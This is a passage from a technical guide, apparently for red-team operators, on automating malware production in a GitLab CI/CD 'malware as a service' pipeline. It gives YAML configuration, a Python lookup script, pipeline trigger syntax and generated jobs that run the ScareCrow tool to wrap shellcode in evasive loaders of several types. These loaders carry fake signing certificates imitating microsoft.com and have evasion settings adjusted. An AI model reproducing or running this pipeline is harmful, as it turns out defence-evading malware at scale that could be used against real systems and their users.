## Creating a Dynamic Child Pipeline

Having achieved the processing of jobs in parallel, we can further extend on the concept if we can create components of the pipeline dynamically, and further if we have the ability to introduce some configuration options into our service.

We know that malware generation tools like **ScareCrow** have different options that allow us to generate different types of artifacts, and perhaps different forms of evasion. Using **ScareCrow** as our example, we can easily implement a dynamic child pipeline based on the different types of *Loader* artifacts it can generate whereby each loader type becomes its own standalone CI/CD job.

The following concepts will be introduced in this document.

1. A YAML based configuration file with a Python script/module that can be used to lookup the configuration options.
2. The Gitlab CI/CD YAML syntax to implement a dependency based trigger which will execute a downstream child pipeline from a dynamically created Gitlab YAML file.  
3. Another Python script which uses ConfigLookup() to generate a child pipeline YAML file.

### YAML Based Configuration and Python ConfigLookup.py Module

In my early malware as a service design, it became quickly apparent that I would have to implement some sort of method for the operator to provide configuration information to the pipeline for processing.  I wanted to keep things simple, and easily digestable for the penetration testing operators and thus I settled on using YAML (https://en.wikipedia.org/wiki/YAML) as a configuration syntax.

Using our example of providing configuration for **ScareCrow**, we can create a hierarchical YAML syntax which reflects the different options we need to provide to the tool. Here is a file named "**SampleConfig.yml**" which does exactly that.

```
ScareCrow:
    loader:
        - binary
        - dll
        - control
        - excel
        - msiexec
        - wscript

    #injection: C:\\windows\\system32\\dataexchangehost.exe

    #delivery:
    #   - bits
    #   - hta
    #   - macro
    #url: https://delivery.acme.com

    ## Fake artifact signing cert uses this domain
    domain: microsoft.com

    ## Sandbox evasion only checks ifDomainJoined
    sandbox: False

    ## the below will selectively disable evasive features
    ## you probably want to keep these all at False.
    noamsi: False
    noetw: True
    nosleep: True
```

Having put this together, my next need was to create a programmatic way of looking up any option within that YAML configuration file. I turned to Python and created a small module/script which allows us to easily lookup any option and print its value back to the screen for consumption.  In this way, I can use the Python script anywhere which the YAML pipeline as needed, or even import this module into another Python script to generate a child pipeline configuration.

Below is an example of using **ConfigLookup.py** on the command line against this sample configuration file. Note that I sent the stderr output to /dev/null only for brevity as a banner is normally printed to the stderr output descriptor.

This example initially looks up ALL the options and prints out the embedded Python dictionary of results. As you can see, it is possible to "*drill down*" and lookup options deeper in the YAML as needed.

```
$ bin/ConfigLookup.py -c SampleConfig.yml 2>/dev/null ScareCrow
{'loader': ['binary', 'dll', 'control', 'excel', 'msiexec', 'wscript'], 'domain': 'microsoft.com', 'sandbox': False, 'noamsi': False, 'noetw': True, 'nosleep': True}

$ bin/ConfigLookup.py -c SampleConfig.yml 2>/dev/null ScareCrow.loader
['binary', 'dll', 'control', 'excel', 'msiexec', 'wscript']

$ bin/ConfigLookup.py -c SampleConfig.yml 2>/dev/null ScareCrow.domain
microsoft.com
```

### Gitlab Dynamic Dependency Driven Child Pipelines

The Gitlab CI/CD YAML syntax allows us to create a *trigger* which depends on an artifact from a prior stage of the pipeline. What we have to do is modify the main pipeline YAML script such that the **PreProcess** stage runs a script to dynamically produce YAML for the child pipeline, and introduces the dependency based trigger which will then execute the downstream YAML file that is generated.  This involves passing a YAML file artifact from the preprocessing stage and configuring it as a dependency in the **BakeMalware** stage.

Listed below are the changes to the Gitlab **.gitlab-ci.yml** file.

```
PreProcess:
    stage: PreProcess
    tags:
        - maas
    script:
        - export PATH=$PATH:${CI_PROJECT_DIR}/bin
        - mkdir -p /payloads/${CI_COMMIT_SHORT_SHA}/.lib
        - ln -f -s /usr/local/bin/garble /payloads/${CI_COMMIT_SHORT_SHA}/.lib/garble
        - ScareCrow_Pipeline.py -c ${CI_PROJECT_DIR}/SampleConfig.yml >.scarecrow.yml
    artifacts:
        paths:
            - .scarecrow.yml

ScareCrow:
    stage: BakeMalware
    trigger:
        include:
        - artifact: .scarecrow.yml
          job: PreProcess
        strategy: depend
```

The result of using this *trigger* section will dynamically create a pipeline run from the file named "**.scarecrow.yml**" which has been created in the **PreProcess** stage by the "**ScareCrow_Pipeline.py**" script.

#### What does ScareCrow_Pipeline.py do?

The **ScareCrow_Pipeline.py** script actually imports the ConfigLookup() functionality from the **ConfigLookup.py** module/script. Using this it creates a Gitlab YAML file which is properly formatted for the parallel child pipeline stages to be executed. While this has been executed by the **ProProcess** stage, we can easily execute it manually and see that the parallelism introduced is based upon the different *Loader* options involved with ScareCrow.

The script also takes into account the various other options configured in the **SampleConfig.yml** file which should be manually edited by the operator.

```
$ bin/ScareCrow_Pipeline.py -c SampleConfig.yml

stages:
    - ScareCrow

ScareCrow00:
    stage: ScareCrow
    tags:
        - maas
    script:
        - |
            cd /payloads/${CI_COMMIT_SHORT_SHA}
            ScareCrow -I $CI_PROJECT_DIR/shellcode/shellcode_x64.bin -Loader binary -domain microsoft.com -noetw -nosleep

ScareCrow01:
    stage: ScareCrow
    tags:
        - maas
    script:
        - |
            cd /payloads/${CI_COMMIT_SHORT_SHA}
            ScareCrow -I $CI_PROJECT_DIR/shellcode/shellcode_x64.bin -Loader dll -domain microsoft.com -noetw -nosleep

ScareCrow02:
    stage: ScareCrow
    tags:
        - maas
    script:
        - |
            cd /payloads/${CI_COMMIT_SHORT_SHA}
            ScareCrow -I $CI_PROJECT_DIR/shellcode/shellcode_x64.bin -Loader control -domain microsoft.com -noetw -nosleep -O output.js

ScareCrow03:
    stage: ScareCrow
    tags:
        - maas
    script:
        - |
            cd /payloads/${CI_COMMIT_SHORT_SHA}
            ScareCrow -I $CI_PROJECT_DIR/shellcode/shellcode_x64.bin -Loader excel -domain microsoft.com -noetw -nosleep -O output.js

ScareCrow04:
    stage: ScareCrow
    tags:
        - maas
    script:
        - |
            cd /payloads/${CI_COMMIT_SHORT_SHA}
            ScareCrow -I $CI_PROJECT_DIR/shellcode/shellcode_x64.bin -Loader msiexec -domain microsoft.com -noetw -nosleep -O output.js

ScareCrow05:
    stage: ScareCrow
    tags:
        - maas
    script:
        - |
            cd /payloads/${CI_COMMIT_SHORT_SHA}
            ScareCrow -I $CI_PROJECT_DIR/shellcode/shellcode_x64.bin -Loader wscript -domain microsoft.com -noetw -nosleep -O output.js

```

